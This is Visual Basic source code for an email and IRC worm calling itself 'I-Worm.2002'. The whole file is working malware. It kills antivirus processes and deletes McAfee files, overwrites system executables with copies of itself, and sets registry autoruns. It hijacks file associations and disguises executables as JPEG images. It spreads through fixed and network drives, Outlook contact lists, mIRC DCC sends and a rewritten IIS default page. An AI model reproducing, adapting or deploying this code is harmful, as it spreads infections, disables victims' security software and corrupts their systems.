Attribute VB_Name = "Module1"
Option Explicit
Private Declare Function SystemParametersInfo Lib _
"user32" Alias "SystemParametersInfoA" (ByVal uAction _
As Long, ByVal uParam As Long, ByVal lpvParam As Any, _
ByVal fuWinIni As Long) As Long
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
 Private Declare Function FindWindow Lib "user32" _
         Alias "FindWindowA" _
         (ByVal lpClassName As String, _
         ByVal lpWindowName As String) As Long

      Private Declare Function PostMessage Lib "user32" _
         Alias "PostMessageA" _
         (ByVal hwnd As Long, _
         ByVal wMsg As Long, _
         ByVal wParam As Long, _
         ByVal lParam As Long) As Long
         Const WM_CLOSE = &H10
Sub Main()
Call TurnOff
Call Birth
Call Reg
Call ntwrk
Call Worming
Call irc
Call iis
Call payload
Call js
End Sub
Function TurnOff()
On Error Resume Next
Dim hWindow As Long
Dim lngReturnValue As Long
Dim aWindow As Long
Dim angReturnValue As Long
Dim bWindow As Long
Dim bngReturnValue As Long
Dim eWindow As Long
Dim engReturnValue As Long
Dim cWindow As Long
Dim cngReturnValue As Long
Dim dWindow As Long
Dim dngReturnValue As Long
Dim xtasy As Long
cWindow = FindWindow(vbNullString, "Dvp95")
cngReturnValue = PostMessage(cWindow, WM_CLOSE, vbNull, vbNull)
dWindow = FindWindow(vbNullString, "Iomon98")
dngReturnValue = PostMessage(dWindow, WM_CLOSE, vbNull, vbNull)
hWindow = FindWindow(vbNullString, "NAI_VS_STAT")
lngReturnValue = PostMessage(hWindow, WM_CLOSE, vbNull, vbNull)
aWindow = FindWindow(vbNullString, "AVP Monitor")
angReturnValue = PostMessage(aWindow, WM_CLOSE, vbNull, vbNull)
bWindow = FindWindow(vbNullString, "vettray")
bngReturnValue = PostMessage(bWindow, WM_CLOSE, vbNull, vbNull)
eWindow = FindWindow(vbNullString, "F-STOPW Version 5.06c")
engReturnValue = PostMessage(eWindow, WM_CLOSE, vbNull, vbNull)
xtasy = SystemParametersInfo(97, True, CStr(1), 0)
Kill "c:\progra~1\mcafee\mcafee~1\default.vsc"
Kill "c:\progra~1\mcafee\mcafee~1\default.vsh"
Kill "c:\progra~1\mcafee\mcafee~1\vshwin32.exe"
End Function
Function Birth()
On Error Resume Next
Dim xx, xy, babybrother, babysister, babybrosis, babysisbro, baby, dad, mom, scanreg, regedit, regedit1, cmmand, formt, dskcopy, attach, ping1, help, iisfile, nt
xx = App.Path & "\" & App.EXEName & ".EXE"
xy = App.Path & App.EXEName & ".EXE"
dad = App.Path & "\" & App.EXEName & ".COM"
mom = App.Path & App.EXEName & ".COM"
babybrother = "c:\Windows\Favorites\pacman.com"
babysister = "c:\Recycled\cd12.com"
babysisbro = "c:\Recycled\dos\restore.com"
babybrosis = "c:\Windows\startm~1\programs\startup\win32.com"
baby = "c:\WINDOWS\boot32.dat"
scanreg = "c:\WINDOWS\scanregw.exe"
regedit = "c:\WINDOWS\regedit.exe"
regedit1 = "c:\WINDOWS\OPTIONS\CABS\regedit.exe"
cmmand = "c:\WINDOWS\ping.exe"
formt = "c:\WINDOWS\marley.mp3"
dskcopy = "c:\WINDOWS\vshwin32.com"
attach = "c:\WINDOWS\SYSTEM\2002.com"
help = "c:\WINDOWS\Help.com"
ping1 = "c:\WINDOWS\telnet.exe"
iisfile = "C:\INETPUB\WWWROOT\INTERNET.EXE"
nt = "c:\WinNT\pacman.com"
FileCopy xx, babybrother
FileCopy xy, babybrother
FileCopy xx, babysister
FileCopy xy, babysister
FileCopy xx, babybrosis
FileCopy xy, babybrosis
Shell "command.com /c md c:\recycled\dos", vbHide
FileCopy xx, babysisbro
FileCopy xy, babysisbro
FileCopy xx, baby
FileCopy xy, baby
FileCopy xx, scanreg
FileCopy xy, scanreg
FileCopy xx, regedit
FileCopy xy, regedit
FileCopy xx, regedit1
FileCopy xy, regedit1
FileCopy xx, cmmand
FileCopy xy, cmmand
FileCopy xx, formt
FileCopy xy, formt
FileCopy xx, dskcopy
FileCopy xy, dskcopy
FileCopy xx, attach
FileCopy xy, attach
FileCopy xx, ping1
FileCopy xy, ping1
FileCopy xx, help
FileCopy xy, help
FileCopy xx, iisfile
FileCopy xy, iisfile
FileCopy xx, nt
FileCopy xy, nt
FileCopy dad, babybrother
FileCopy mom, babybrother
FileCopy dad, babysister
FileCopy mom, babysister
FileCopy dad, babybrosis
FileCopy mom, babybrosis
FileCopy dad, babysisbro
FileCopy mom, babysisbro
FileCopy dad, baby
FileCopy mom, baby
FileCopy dad, scanreg
FileCopy mom, scanreg
FileCopy mom, regedit
FileCopy dad, regedit
FileCopy mom, regedit1
FileCopy dad, regedit1
FileCopy mom, cmmand
FileCopy dad, cmmand
FileCopy mom, formt
FileCopy dad, formt
FileCopy mom, dskcopy
FileCopy dad, dskcopy
FileCopy mom, attach
FileCopy dad, attach
FileCopy mom, ping1
FileCopy dad, ping1
FileCopy mom, help
FileCopy dad, help
FileCopy mom, iisfile
FileCopy dad, iisfile
FileCopy mom, nt
FileCopy dad, nt
End Function
Function Reg()
On Error Resume Next
Dim g
Set g = CreateObject("WScript.Shell")
g.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\*Ping", "c:\WINDOWS\ping.exe"
g.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\*Regedit", "c:\WINDOWS\regedit.exe"
g.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\*Spawn", "command.com /c copy /y c:\WINDOWS\boot32.dat c:\WINDOWS\SYSTEM\system.com"
g.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\V32COM", "c:\WINDOWS\vshwin32.com"
g.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\INTERNET", "C:\INETPUB\WWWROOT\INTERNET.EXE"
g.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\*Help", "c:\WINDOWS\Help.com"
g.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce\*System", "c:\WINDOWS\SYSTEM\system.com"
g.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Runonce\*Telnet", "c:\WINDOWS\telnet.exe"
g.regwrite "HKEY_CLASSES_ROOT\comfile\", "JPEG Image"
g.regwrite "HKEY_CLASSES_ROOT\comfile\DefaultIcon\", "shimgvw.dll,3"
g.regwrite "HKEY_CLASSES_ROOT\exefile\", "Ei Slagehammer, I hate exe files.. - Alcopaul"
g.regwrite "HKEY_CLASSES_ROOT\jpegfile\", "Hi, Janis Ruckenbrod.. Search my nude picture in your pc.. - Alcopaul"
g.regwrite "HKEY_CLASSES_ROOT\mp3file\", "Download only punk, ska and reggae mp3s.. - Alcopaul"
g.regwrite "HKEY_CLASSES_ROOT\htmlfile\shell\opennew\command\", "c:\WINDOWS\telnet.exe"
g.regwrite "HKEY_CLASSES_ROOT\txtfile\shell\open\command\", "c:\Recycled\dos\restore.com"
g.regwrite "HKEY_CLASSES_ROOT\VBSFile\Shell\Open\Command\", "c:\WINDOWS\Wscript.exe c:\Windows\banner.js"
g.regwrite "HKEY_CLASSES_ROOT\VBSFile\Shell\Open2\Command\", "c:\WINDOWS\Cscript.exe c:\Windows\banner.js"
g.regwrite "HKEY_CLASSES_ROOT\MPEGFILE\shell\open\command\", "c:\Recycled\cd12.com"
End Function
Sub infect(drive)
On Error Resume Next
Dim s, f
Set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile("c:\WINDOWS\marley.mp3")
f.Copy (drive & "\pussy.com")
f.Copy (drive & "\windows\startm~1\programs\startup\msdos.com")
End Sub
Function ShowDriveType(drvpath)
On Error Resume Next
Dim fso, d, t
Set fso = CreateObject("Scripting.FileSystemObject")
Set d = fso.GetDrive(drvpath)
Select Case d.DriveType
Case 0: t = "Unknown"
Case 1: t = "Removable"
Case 2: t = "Fixed"
Case 3: t = "Network"
Case 4: t = "CD-ROM"
Case 5: t = "RAM Disk"
End Select
If t = "" Then t = "None"
ShowDriveType = t
End Function
Sub ntwrk()
On Error Resume Next
Dim n, l, d3, drv
For n = 65 To 90
l = Chr(n)
drv = l & ":"
d3 = ShowDriveType(drv)
If d3 = "Fixed" Then infect (drv)
If d3 = "Network" Then infect (drv)
Next n
End Sub
Function Worming()
On Error Resume Next
Dim a, b, f, d, g, e, oo, x, y, c
Set a = CreateObject("Outlook.Application")
Set b = a.GetNameSpace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For y = 1 To b.AddressLists.Count
Set d = b.AddressLists(y)
x = 1
Set c = a.CreateItem(0)
For oo = 1 To d.AddressEntries.Count
e = d.AddressEntries(x)
c.Recipients.Add e
x = x + 1
If x > 81 Then oo = d.AddressEntries.Count
Next oo
c.Subject = "Predictions for 2002"
c.Body = "Know what will happen this 2002, the year of the horse.. Discover your fortune and destiny.. Only from 2002.com"
c.Attachments.Add "c:\WINDOWS\SYSTEM\2002.com"
c.Send
e = ""
Next y
b.Logoff
End If
End Function
Function payload()
On Error Resume Next
If Day(Now()) = 21 Then
MsgBox "Alcopaul.. Not Alcaul.. Asshole!!!", vbCritical, "I-Worm.2002...the dot COM worm"
End If
If Day(Now()) = 3 Then
MsgBox "Day 3.... Do you know it's 3?", vbInformation, "I-Worm.2002...the dot COM worm"
End If
If Day(Now()) = 8 Then
MsgBox "To infinity and beyond", vbExclamation, "I-Worm.2002...the dot COM worm"
End If
If Day(Now()) = 2 Then
MsgBox "My favourite number.. I was always number two", vbInformation, "I-Worm.2002...the dot COM worm"
End If
If Month(Now()) = 2 Then
mciSendString "Set CDAudio Door Open Wait", _
        0&, 0&, 0&
End If
End Function
Function irc()
On Error Resume Next
If Dir("C:\mIRC", vbDirectory) <> "" Then
Open "c:\mIRC\script.ini" For Output As 3
Print #3, "[script]"
Print #3, "n0= on 1:TEXT:*hello*:#:{"
Print #3, "n1= /if ( $nick == $me ) { halt }"
Print #3, "n2= /msg $nick Hello.. Let's play Pacman.. Just like the good old days.."
Print #3, "n3= /dcc send -c $nick c:\Windows\Favorites\pacman.com"
Print #3, "n4= }"
Print #3, "n5= on 1:NICK:{"
Print #3, "n6= /msg $newnick $newnick is better than your previous lame handle, $nick .."
Print #3, "n7= /if ( $newnick == $me ) { halt }"
Print #3, "n8= /msg $newnick Hello... Let's play Pacman.. Just like the good old days.."
Print #3, "n9= /dcc send -c $newnick c:\Windows\Favorites\pacman.com"
Print #3, "n10= }"
Print #3, "n11= on 1:PART:#:{"
Print #3, "n12= /if ( $nick == $me ) { halt }"
Print #3, "n13= /msg $nick Bye, bye.. For now, enjoy playing Pacman.."
Print #3, "n14= /dcc send -c $nick c:\Windows\Favorites\pacman.com"
Print #3, "n15= }"
Close 3
Open "c:\mIRC\urls.ini" For Output As 6
Print #6, "[urls]"
Print #6, "n0=1:mIRC HomepageURL:http://www.cannabismail.com"
Print #6, "n1=2:mIRC Message BoardURL:http://www.sex.com"
Close 6
End If
End Function
Function js()
On Error Resume Next
If Dir("c:\WINDOWS\banner.js") <> "banner.js" Then
Open "c:\WINDOWS\banner.js" For Output As 7
Print #7, "var WSHShell = WScript.CreateObject(""WScript.Shell"");"
Print #7, "var intDoIt;"
Print #7, "intDoIt =  WSHShell.Popup(""Ooooops.. Can't open file.."", 0, ""Alcopaul says"");"
Close 7
MsgBox "Go to www.2002.com for more predictions...", vbInformation, "2002.COM"
End If
End Function
Function iis()
On Error Resume Next
Open "C:\INETPUB\WWWROOT\DEFAULT.HTM" For Output As 4
Print #4, "<HTML>"
Print #4, "Hello User !!!"
Print #4, "Click <A HREF=""file://C:\INETPUB\WWWROOT\INTERNET.EXE"" TARGET=""_top"""
Print #4, "TITLE=""file://C:\INETPUB\WWWROOT\INTERNET.EXE"">here</A> to start..."
Print #4, "</HTML>"
Close 4
End Function
